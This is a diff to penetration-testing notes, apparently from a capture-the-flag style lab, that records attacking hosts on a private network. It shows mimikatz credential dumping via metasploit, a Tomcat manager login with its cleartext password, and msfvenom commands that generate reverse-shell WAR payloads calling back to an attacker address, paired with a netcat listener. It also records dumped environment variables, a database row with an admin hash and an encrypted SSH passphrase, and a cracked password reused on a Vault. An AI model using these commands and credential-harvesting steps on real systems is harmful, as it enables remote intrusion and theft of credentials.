@@ -184,11 +184,12 @@ https://jenkins.io/security/advisory/2018-12-05/
 .20 - Alice, windows 8.1
 .21 - Bob - cannot run meterpreter
 .22 - Charles - cannot run meterpreter
-.23 - D - 
+.23 - D - dave
 .24 - E Edward - windows 8.1 9600
 .25 - windows, fred -
  + Fred: WildFred8300
 
+** Timeline 
 14:28 - used mimikatz through metasploit 
 ~msv~ credentials - shows only Alice's credentials
 
@@ -254,6 +255,41 @@ password: This is not the password you're looking for.
 
 *** Vault - .13
 http://10.59.4.13:8080/vsEncryptionPhrase
+
+*** Tomcat exploitation
+
+Password for the tomcat manager: 
+Result: $zFSKM#o#S3QrDS!D(nq
+
+manager url: http://10.59.4.13:8080/manager/
+login: tomcat
+Result: $zFSKM#o#S3QrDS!D(nq
+
+Tomcat default credentials site: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
+
+Let's generate a reverse shell:
++ Reverse shell
+msfvenom --payload java/meterpreter/reverse_tcp --format war LHOST=10.59.4.104 LPORT=443 > reverse443.war
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.59.4.104 LPORT=443 -f war > shell.war
+
+nc -lnvp 443
+
+*** environment variables from the tomcat server
+
+export from the server:
+export CHALLENGE_USER='*shared*'
+export GPG_KEYS='05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 80FF76D88A969FE46108558A80B953A041E49465 8B39757B1D8A994DF2433ED58B3A601F08C975E5 A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 B3F49CD3B9BD2996DA90F817ED3873F5D3262722 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23'
+
+~cat ~/hsqldb.scripts~
+INSERT INTO VS_USER VALUES(1,'Administrator Account','root@localhost.com',TRUE,TRUE,'5033b55c74e5c56686f25bb6f2d21f79','Administrator','admin')
+
+INSERT INTO VS_CREDENTIAL VALUES(1,NULL,NULL,'ssh passphrase for production machines',NULL,'VfaMEAdo2luxkvvnmMQ3EQ==',FALSE,NULL,NULL,NULL)
+INSERT INTO VS_DATABASE_VERSION VALUES(1,0,'0.6.7')
+INSERT INTO VS_ENCRYPTION_VERIFICATION VALUES(1,0,'X+94zVoou/pcz8CwUsb1y2YzLq0mK/kIzx5H1riOB5H2PqDyaacg+eOSmufFD9EqnN5XVBKJHbdbkWEXaHj0WUOBdG6mv/y/psN1gem46Io=')
+
+md5 reverse of VfaMEAdo2luxkvvnmMQ3EQ== funkeymonkey124
+-> worked for Federico in Vault
 
 * Challenge 4
 
